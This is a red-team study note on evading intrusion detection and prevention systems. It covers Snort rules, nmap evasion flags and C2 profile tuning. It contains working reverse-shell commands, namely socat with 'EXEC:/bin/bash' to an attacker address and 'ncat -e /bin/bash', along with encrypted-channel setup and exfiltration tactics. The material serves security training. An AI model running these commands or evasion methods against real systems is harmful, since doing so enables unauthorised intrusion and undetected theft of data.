---
{"dg-publish":true,"permalink":"/cards/red-team/network-security-solutions/","tags":["red-team/host-evasion"]}
---

~ [[atlas/red-team\|red-team]]
### Introduction 
---
There are two common network security solutions, these are Intrusion Detection System, which only detects network intrusion and Intrusion Prevention System, which detects and prevent intrusions.

These can be deployed in two ways, one is **host based**, it can monitor traffic going in and out of the host while the other one is **network based** which monitors the network.

#### Key Topics
---

## Prerequisites

- [[cards/blue-team/network-security/Snort\|Snort]] 

## IDS Engine Types
---

1. **Signature-based**: A signature-based IDS requires full knowledge of malicious (or unwanted) traffic. In other words, we need to explicitly feed the signature-based detection engine the characteristics of malicious traffic. Teaching the IDS about malicious traffic can be achieved using explicit rules to match against.
2. **Anomaly-based**: This requires the IDS to have knowledge of what regular traffic looks like. In other words, we need to “teach” the IDS what normal is so that it can recognize what is **not** normal. Teaching the IDS about normal traffic, i.e., baseline traffic can be achieved using machine learning or manual rules.

## IDS/IPS Rule Triggering
---
In [[cards/blue-team/network-security/Snort\|Snort]], an IPS/IDS tool -- to create a rule, we follow this syntax:

1. Action: Examples of action include `alert`, `log`, `pass`, `drop`, and `reject`.
2. Protocol: `TCP`, `UDP`, `ICMP`, or `IP`.
3. Source IP/Source Port: `!10.10.0.0/16 any` refers to everything not in the class B subnet `10.10.0.0/16`.
4. Direction of Flow: `->` indicates left (source) to right (destination), while `<>` indicates bi-directional traffic.
5. Destination IP/Destination Port: `10.10.0.0/16 any` to refer to class B subnet `10.10.0.0/16`.

Then below is an example rule to `drop` all ICMP traffic:

```C
drop icmp any any -> any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)
```

Now lets assume we are monitoring for possible attacks occuring in our web server, more specifically we want to look for `ncat` commands in our web server, to detect this:

```C
alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"ncat"; sid: 1000030; rev:1;)
```

This would successfully alert any `ncat` usage but there is a **problem**, what about the term `nc` or short for netcat too? Signature-based IDS or IPS is limited to how well-written and updated its signatures (rules) are.
## Evasion via Protocol Manipulation
---
Evading a signature-based IDS/IPS requires that you manipulate your traffic so that it does not match any IDS/IPS signatures. Here are four general approaches you might consider to evade IDS/IPS systems.

1. Evasion via Protocol Manipulation
2. Evasion via Payload Manipulation
3. Evasion via Route Manipulation
4. Evasion via Tactical Denial of Service (DoS)

This technique includes:

- Relying on a different protocol
- Manipulating (Source) TCP/UDP port
- Using session splicing (IP packet fragmentation)
- Sending invalid packets
### Rely on a Different Protocol
---
The IDS/IPS system might be configured to block certain protocols and allow others such as the use of UDP instead of TCP or rely on HTTP instead of DNS to exfiltrate data.

The problem with this, it is a trial and error effort with the importance consideration of these trials making a lot of **noise**.

In this example: The IPS is configured to block some protocols but allows others, additionally **local machines cannot query external DNS servers** but should instead query the local DNS server:

- Port 80 (HTTP) blocked
- Port 443 (HTTPS) allowed
- Port 53 (DNS) blocked

![Network Security Solutions.png](/img/user/cards/red-team/images/Network%20Security%20Solutions.png)

So, the attacker cannot exfiltrate data using **DNS tunneling** (since external DNS is blocked.) or plain **HTTP traffic**, but **HTTPS** is relatively unrestricted making HTTPs its best bet for attacking purposes.

`ncat` by default uses TCP connection but can be configured to use UDP by adding the `-u` switch.

Listen using TCP:

```C
ncat -nvlp PORT_NUM
```

Connect to a listening server (`-u` is required if the NCAT server or listening server is configured to use UDP only):

```C
ncat TARGET_IP PORT NUM
```

Based on our scenario, since the IPS allows **HTTPS (443)**, an attacker can just run Netcat on port 443.

- To the IPS eyes, this just looks like a normal "HTTPS traffic" because it's TCP/443.
- If the IPS doesn't decrypt SSL/TLS, it won't notice the difference, since it's encrypted this makes Deep Packet Inspection usesless.
- **HTTPS** tunneling is the best bet here since every organization relies on the web.

### Manipulate (Source) TCP/UDP Port
---
Even the most basic security solutions inspect TCP and UDP source and destination ports. Without deep packet inspection, the port numbers are the primary indicators.

Normal traffic has **well-known source and destination ports**.

- Example: a client browsing the web -> **source port random high (>1024)** -> **destination port 80/443**.

`nmap -g` option forces to send all its packet from a specific source port, rather than a high random port.

**Masquerade as HTTP traffic:**

To the IPS, it looks like the traffic is coming from port 80, it might be mistaken for web browsing.

```C
nmap -sS -Pn -g 80 -F 10.201.120.218
```

- `-sS` -> SYN scan (stealthy, TCP).
- `-Pn` -> don’t ping (treat target as alive).
- `-g 80` -> make the **source port 80** (like a web server).
- `-F` -> fast scan (top 100 ports).

You can try to **camouflage the traffic** as if it is some DNS traffic.

```C
ncat -ulvnp 53
```

Then connect to the listening server

```
ncat -u ATTACKER_IP 53
```

### Use Session Splicing (IP Packet Fragmentation)
---
This works on IPv4, this assumes that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signature. Unless the IDS reassembles the packets, the rule won't be triggered.

Nmap offers a few options to fragment packets. You can add:

- `-f` to set the data in the IP packet to 8 bytes.
- `-ff` to limit the data in the IP packet to 16 bytes at most.
- `--mtu SIZE` to provide a custom size for data carried within the IP packet. The size should be a multiple of 8.

Additionally taking a look at `fragroute` which allows you to configure to force all your packets to be fragmentend into specific sizes.
#### Sending Invalid Packets
---
It can be unclear how systems would respond to invalid packets. For instance, an IDS/IPS might process an invalid packet, while the target system might ignore it. The exact behavior would require some experimentation or inside knowledge.

`nmap --badsum`

- Makes Nmap send packets with **intentionally bad TCP/UDP checksums**.
- Normally, the OS discards such packets as corrupted.
- But if the target replies, and the IPS ignores the packet (thinking it’s corrupted), the attacker learns:

    - The IPS isn’t validating end-to-end checksums.
    - The target OS is more forgiving.

```C
nmap -sS --badsum 10.201.120.218
```

`nmap --scanflags`

- Lets you create custom **TCP flags**.
- Normal 3-way handshake: `SYN -> SYN/ACK -> ACK`.
- Attackers can send unusual combinations, e.g.:

	- `--scanflags FINPSHURG` -> all three flags set.
	- `--scanflags SYNFIN` -> contradictory flags (start and end).

Why?

- Some targets respond differently to "illegal" flag combos, revealing OS or firewall quirks.
- Some IDS/IPS systems may ignore traffic with strange flags, letting it slip through.

```C
nmap -sS --scanflags SYNRSTFIN 10.201.120.218
```

## Evasion via Payload Manipulation
---
Since IDS/IPS rules are very specific, you can easily make minor changes to avoid detection such as adding extra bytes, obfuscating the attack data, and encrypting the communication.

Consider this command:

```C
ncat -lvnp 1234 -e /bin/bash
```

Encode this using base64, url encoding, and using escaped unicode, as some application will still process your input and execute it properly.

![Network Security Solutions-1.png](/img/user/cards/red-team/images/Network%20Security%20Solutions-1.png)
### Encrypt the Communication Channel
---
Since IDS/IPS can't or won't inspect encrypted data (depends on the features of the IDS/IPS software used) this can be taken advantage to evade detection.

Creating an encrypted communication channel using `socat`:

**1. Create the key**

The most important detail is the `thm-reverse.key` (Private key) and `thm-reverse.crt` (Certificate)

```C
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
```

Learn more about [[cards/dots/Public Key Infrastructure (PKI)\|Public Key Infrastructure (PKI)]].

The _Privacy Enhanced Mail (PEM)_ files requires the concatenation of the private key and the certificate files.

```C
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
```

A **PEM file** is just a text file that stores cryptographic data like certificates, private keys, or both, using **Base64 encoding with header/footer lines**, this file is what many servers/tools expect.

**2. Start listening while using the key for encrypting the communication with the client**

```C
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
```

- `-d -d` provides some debugging data (fatal, error, warning, and notice messages)
- `OPENSSL-LISTEN:PORT_NUM` indicates that the connection will be encrypted using OPENSSL
- `cert=PEM_FILE` provides the PEM file (certificate and private key) to establish the encrypted connection
- `verify=0` disables checking peer’s certificate
- `fork` creates a sub-process to handle each new connection.

**3. Attempt connection the server in the victim machine**

```C
socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
```

This is the view when displaying the contents of `/etc/passwd` while in encrypted in Wireshark:

![Network Security Solutions-2.png|550](/img/user/cards/red-team/images/Network%20Security%20Solutions-2.png)

Without encryption:

1. On the attacker’s system, we run `socat -d -d TCP-LISTEN:4443,fork STDOUT`.
2. On the victim’s machine, we run `socat TCP:10.20.30.129:4443 EXEC:/bin/bash`.
3. Back on the attacker’s system, we type `cat /etc/passwd` and hit Enter/Return.

![Network Security Solutions-3.png|550](/img/user/cards/red-team/images/Network%20Security%20Solutions-3.png)
## Evasion via Route Manipulation
---

### Relying on Source Routing
---
Normally, when you send packets, the **network decides the route** (each router chooses the next hop)

With **source routing**, you (the sender) tell the network exactly which path the packets should take.

- **Loose routing (`L`)** - You specify a few hops, but routers can choose others in between.

```C
--ip-options "L 10.10.10.50 10.10.50.250"
```

- **Strict routing (`S`)** - You must specify _every hop_.

```C
--ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3"
```
    
Nmap can do this with `--ip-options`. It’s rarely used today because most networks **block source-routed packets** (security risk).

### Proxy Servers
---
Instead of sending packets directly to the target, you send them through **proxy servers** first to hide your real source.

```C
nmap -sS --proxies HTTP://proxy1:8080,SOCKS4://proxy2:4153 10.201.23.130
```

Its important to **note** that proxy must be running, reachable and supports relaying TCP connections.
## Evasion via Tactical DOS
---
An IDS/IPS requires a high processing power as the number of rules grows and the network traffic volume increases.

- Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
- Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity.

Its also worth nothing that you can attack the IDS/IPS operating, by causing a vast amount of false positives resulting to alert or operator fatigue.
## C2 and IDS/IPS Evasion
---
Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command and Control (C2) profiles. These profiles allow various fine-tuning to evade IDS/IPS systems. it is worth creating a custom profile instead of relying on a default one. 

Variables to modify:

- **User-Agent**: The tool or framework you are using can expose you via its default-set user-agent. Hence, it is always important to set the user-agent to something innocuous and test to confirm your settings.
- **Sleep Time**: The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how often the infected system will attempt to connect to the control system.
- **Jitter**: This variable lets you add some randomness to the sleep time, specified by the jitter percentage. A jitter of 30% results in a sleep time of ±30% to further evade detection.
- **SSL Certificate**: Using your authentic-looking SSL certificate will significantly improve your chances of evading detection. It is a very worthy investment of time.
- **DNS Beacon**: Consider the case where you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting the DNS servers and the hostname in the DNS query. The hostname will be holding the exfiltrated data.



### Questions and Problems
---
## Conclusion


